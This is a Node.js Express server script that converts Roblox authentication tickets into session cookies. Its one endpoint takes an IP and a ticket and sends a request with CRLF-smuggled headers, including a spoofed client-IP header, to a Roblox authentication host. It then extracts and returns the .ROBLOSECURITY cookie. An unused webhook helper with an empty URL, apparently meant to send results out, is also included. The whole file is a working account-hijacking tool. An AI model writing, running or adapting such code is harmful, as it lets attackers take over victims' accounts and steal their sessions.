const express = require('express');
const axios = require('axios');
const app = express();

app.get('/convert/:ip/:authticket', async function(req, res) {
  
    try {
        const result = await axios.post(`https://auth.roblox.qq.com/v1/authentication-ticket/redeem%20HTTP%2F1.1%0AHost%3A%20auth.roblox.com%0AContent-Length%3A%201106%0ARoblox-CNP-True-IP%3A%20${req.params.ip}%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F89.0.4389.128%20Safari%2F537.36%0AContent-Type%3A%20application%2Fjson%0ARBXAuthenticationNegotiation%3A%201%0A%0A%7B%22authenticationTicket%22%3A%20%22${req.params.authticket}%22%7D`);
        const cookie = result.headers["set-cookie"].toString().split('.ROBLOSECURITY=').pop().split(';')[0];
        
        if(cookie.includes("_|WARNING:")){

            try{
              res.send({Cookie: cookie})
            }catch (err){
              console.log(err)
            }
        }else{ 
          res.send({Cookie: "Not Found"})
        }
    } catch (error) {
      res.send({error: "IP or Authentication-Ticket is invalid."})
    }
});


app.listen(8081, function () {
    console.log("Started")
})

async function sendWebhook(message){

    try{
        await axios.post('', {content: message}, {headers: { 'Content-Type': 'application/json' }});
    }catch (error){
        console.log(error)
    }
}